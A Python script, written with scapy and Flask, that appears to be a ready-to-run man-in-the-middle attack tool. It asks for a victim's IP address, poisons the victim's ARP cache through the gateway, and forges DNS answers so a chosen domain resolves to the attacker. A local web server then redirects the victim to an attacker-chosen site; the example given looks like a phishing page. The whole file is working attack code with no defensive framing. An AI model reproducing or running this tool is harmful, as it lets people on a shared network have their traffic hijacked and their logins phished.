import os
import sys
import time
import threading
from scapy.all import *
from flask import Flask, redirect

# Function to enable IP forwarding
def enable_ip_forwarding():
    """Enable IP forwarding to allow the victim to access the internet."""
    print("Enabling IP forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("sysctl -w net.ipv4.ip_forward=1")

# Function to disable IP forwarding
def disable_ip_forwarding():
    """Disable IP forwarding to restore original network settings."""
    print("Disabling IP forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    os.system("sysctl -w net.ipv4.ip_forward=0")

# Function for ARP spoofing
def get_mac(ip):
    """Find the MAC address of a given IP."""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return answered[0][1].hwsrc if answered else None

def arp_spoof(target_ip, gateway_ip):
    """Send a fake ARP reply to redirect traffic."""
    target_mac = get_mac(target_ip)
    if not target_mac:
        return
    spoofed_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    send(spoofed_packet, verbose=False)

def start_arp_spoofing(target_ip, gateway_ip):
    """Start ARP spoofing in the background."""
    try:
        while True:
            arp_spoof(target_ip, gateway_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nStopping ARP spoofing...")

# Function for DNS spoofing (to handle both domain and IP)
def dns_spoof(pkt, fake_ip, target_domain):
    """Modify DNS response to redirect to the fake IP."""
    if pkt.haslayer(DNSRR):
        qname = pkt[DNSQR].qname.decode()
        if qname == target_domain + ".":
            # DNS spoofing to redirect the domain to the fake IP
            answer = DNSRR(rrname=qname, rdata=fake_ip)
            pkt[DNS].ancount = 1
            pkt[DNS].arcount = 0
            pkt[DNS].an = answer
            del pkt[IP].len
            del pkt[IP].chksum
            del pkt[UDP].len
            del pkt[UDP].chksum
            send(pkt, verbose=False)

def start_dns_spoofing(target_domain, fake_ip):
    """Start DNS spoofing in the background."""
    print("Starting DNS spoofing...")
    sniff(filter="udp and port 53", store=0, prn=lambda pkt: dns_spoof(pkt, fake_ip, target_domain))

# Flask server for the fake website
def create_fake_website(fake_site_ip, fake_website_url):
    """Create a simple fake website using Flask."""
    app = Flask(__name__)

    @app.route('/')
    def fake_site():
        print(f"Redirecting to: http://{fake_website_url}")
        return redirect(f"http://{fake_website_url}", code=302)

    print(f"Starting Flask server on {fake_site_ip}:80")
    app.run(host=fake_site_ip, port=80, debug=False)

# Main function to combine everything
def run_dns_spoofing():
    # Display the welcome message with fancy font
    os.system("/usr/bin/figlet 'Welcome to DNS Spoofing' | /usr/games/lolcat")

    # Get user input for network settings
    victim_ip = input("Enter Victim's IP address: ")
    gateway_ip = input("Enter Gateway IP address (router's IP): ")
    fake_site_ip = input("Enter your IP address: ")
    target_domain = input("Enter the domain name you want to spoof (e.g., linked.com): ")
    fake_website_url = input("Enter the fake website URL (e.g., nexgen-5cc26.web.app): ")

    print("\nStarting setup...\n")

    # Start IP forwarding
    enable_ip_forwarding()

    # Start the fake website server in a background thread
    fake_website_thread = threading.Thread(target=create_fake_website, args=(fake_site_ip, fake_website_url))
    fake_website_thread.daemon = True
    fake_website_thread.start()

    # Start ARP spoofing in a background thread
    arp_spoof_thread = threading.Thread(target=start_arp_spoofing, args=(victim_ip, gateway_ip))
    arp_spoof_thread.daemon = True
    arp_spoof_thread.start()

    # Start DNS spoofing in the background
    dns_spoof_thread = threading.Thread(target=start_dns_spoofing, args=(target_domain, fake_site_ip))
    dns_spoof_thread.daemon = True
    dns_spoof_thread.start()

    print(f"\nSpoofing {target_domain} to {fake_website_url}...\n")
    print("All scripts are running...\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting DNS Spoofing...")
        # Gracefully handle the exit by disabling IP forwarding
        disable_ip_forwarding()
        sys.exit(0)
    except SystemExit:
        # Handling forced exit (Ctrl+C or otherwise)
        disable_ip_forwarding()
        print("Forced exit. Disabling IP forwarding...")
        sys.exit(0)

# Run the combined script
if __name__ == '__main__':
    run_dns_spoofing()
